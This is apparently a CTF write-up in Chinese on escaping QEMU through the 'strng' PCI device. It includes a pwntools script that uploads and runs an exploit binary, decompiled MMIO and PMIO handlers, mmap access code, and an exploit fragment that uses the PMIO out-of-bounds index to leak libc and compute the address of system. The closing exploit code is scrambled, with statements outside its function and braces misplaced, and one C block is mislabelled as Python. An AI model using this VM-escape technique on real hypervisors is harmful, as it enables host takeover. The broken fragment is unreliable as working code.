# EXP 上传脚本
```python
from pwn import *

ch = b'/ # '	# 根据题目情况更改

# io = remote("192.168.1.207",10023)
# io.sendlineafter(b"buildroot login: ",b"root")
# io.sendlineafter(ch,b"ls")

io = remote("127.0.0.1",5555)

def upload(lname, rname):
    print("[*] uploading %s ..." % lname)
    payload = b64e(open(lname,'rb').read())
    a = len(payload) // 500
    for i in range(a + 1):
        print("[+] %d/%d" % (i,a))
        s = 'echo "' + payload[i*(500):(i+1)*500] + '" >> %s.b64' % rname
        io.sendlineafter(ch,s.encode('utf-8'))
    cmd = 'cat %s.b64 | base64 -d > %s' % (rname,rname)
    io.sendlineafter(ch,cmd.encode('utf-8'))

context.log_level = 'debug'
io.sendline("ls")

io.sendlineafter(ch,b"chmod +x /tmp/test")
io.sendlineafter(ch,b"/tmp/test")
io.interactive()
```

### MMIO
```c
uint64_t __fastcall strng_mmio_read(void *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax

  result = -1;
  if ( size == 4 && (addr & 3) == 0 )
    return *((unsigned int *)opaque + (addr >> 2) + 701);
  return result;
}
```

```c
void __fastcall strng_mmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  hwaddr v4; // rsi
  int v5; // eax
  int vala; // [rsp+8h] [rbp-30h]

  if ( size == 4 && (addr & 3) == 0 )
  {
    v4 = addr >> 2;
    if ( (_DWORD)v4 == 1 )
    {
      opaque->regs[1] = ((__int64 (__fastcall *)(STRNGState *, hwaddr, uint64_t))opaque->rand)(opaque, v4, val);
    }
    else if ( (_DWORD)v4 )
    {
      if ( (_DWORD)v4 == 3 )
      {
        vala = val;
        v5 = opaque->rand_r(&opaque->regs[2]);
        LODWORD(val) = vala;
        opaque->regs[3] = v5;
      }
      opaque->regs[(unsigned int)v4] = val;
    }
    else
    {
      opaque->srand(val);
    }
  }
}
```

访问：

因为 MMIO 是以内存地址来访问，所以可以通过 mmap 来映射这段内存从而实现访问

```c
unsigned char* mmio_mem;

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

int main(int argc, char *argv[])
{

    // Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");
}
```

### PMIO
```c
uint64_t __fastcall strng_pmio_read(void *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax
  unsigned int v4; // edx

  result = -1;
  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        v4 = *((_DWORD *)opaque + 700);
        if ( (v4 & 3) == 0 )
          return *((unsigned int *)opaque + (v4 >> 2) + 701);
      }
    }
    else
    {
      return *((unsigned int *)opaque + 700);
    }
  }
  return result;
}
```

```python
void __fastcall strng_pmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  unsigned int v4; // eax
  __int64 v5; // rax

  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        v4 = *((_DWORD *)opaque + 700);
        if ( (v4 & 3) == 0 )
        {
          v5 = v4 >> 2;
          if ( (_DWORD)v5 == 1 )
          {
            *((_DWORD *)opaque + 702) = (*((__int64 (__fastcall **)(void *, __int64, uint64_t))opaque + 384))(
                                          opaque,
                                          4,
                                          val);
          }
          else if ( (_DWORD)v5 )
          {
            if ( (_DWORD)v5 == 3 )
              *((_DWORD *)opaque + 704) = (*((__int64 (__fastcall **)(char *, __int64, uint64_t))opaque + 385))(
                                            (char *)opaque + 2812,
                                            4,
                                            val);
            else
              *((_DWORD *)opaque + v5 + 701) = val;
          }
          else
          {
            (*((void (__fastcall **)(_QWORD))opaque + 383))((unsigned int)val);
          }
        }
      }
    }
    else
    {
      *((_DWORD *)opaque + 700) = val;
    }
  }
}
```

### 相关函数
#### mmap 函数
将一个文件或设备映射到调用进程的虚拟地址空间，从而实现对 MMIO 对应的 resource0 文件的读写

定义：

```c
#include <sys/mman.h>

void *mmap(void *addr,
           size_t length,
           int prot,
           int flags,
           int fd,
           off_t offset);
```

#### inl / outl 函数
```c
inl(port);
outl(value,port);
```

<font style="background-color:rgba(255, 255, 255, 0);">本质上是封装了 x86 的汇编指令：</font>

| **<font style="background-color:rgba(255, 255, 255, 0);">C 函数</font>** | **<font style="background-color:rgba(255, 255, 255, 0);">对应汇编指令</font>** |
| --- | --- |
| `<font style="background-color:rgba(255, 255, 255, 0);">inb(port)</font>` | `<font style="background-color:rgba(255, 255, 255, 0);">in %al, %dx</font>` |
| `<font style="background-color:rgba(255, 255, 255, 0);">inw(port)</font>` | `<font style="background-color:rgba(255, 255, 255, 0);">in %ax, %dx</font>` |
| `<font style="background-color:rgba(255, 255, 255, 0);">inl(port)</font>` | `<font style="background-color:rgba(255, 255, 255, 0);">in %eax, %dx</font>` |
| `<font style="background-color:rgba(255, 255, 255, 0);">outb(val, port)</font>` | `<font style="background-color:rgba(255, 255, 255, 0);">out %dx, %al</font>` |
| `<font style="background-color:rgba(255, 255, 255, 0);">outw(val, port)</font>` | `<font style="background-color:rgba(255, 255, 255, 0);">out %dx, %ax</font>` |
| `<font style="background-color:rgba(255, 255, 255, 0);">outl(val, port)</font>` | `<font style="background-color:rgba(255, 255, 255, 0);">out %dx, %eax</font>` |


<font style="background-color:rgba(255, 255, 255, 0);">这题的利用点在 PMIO 这边，因为 MMIO 那边因为正好寄存器数组跟 MMIO 内存空间一样大，想要越界读写的话对应的 addr 就超过 MMIO 内存空间了，所以没法越界读写，而 PMIO 这边因为 state 结构体的 addr 指针可以被修改，所以可以实现任意读写</font>

<font style="background-color:rgba(255, 255, 255, 0);">exp：</font>

```c
uint64_t pmio_arbread(uint32_t offset)

    pmio_write(pmio_base,offset);

{

    srand_addr |= (pmio_arbread(((0xBF8-0xAF4))+4) << 32);
    HEX(srand_addr);

    uint64_t system_addr = srand_addr+0xe650ULL;
    LOG("system:");
    HEX(system_addr);
```
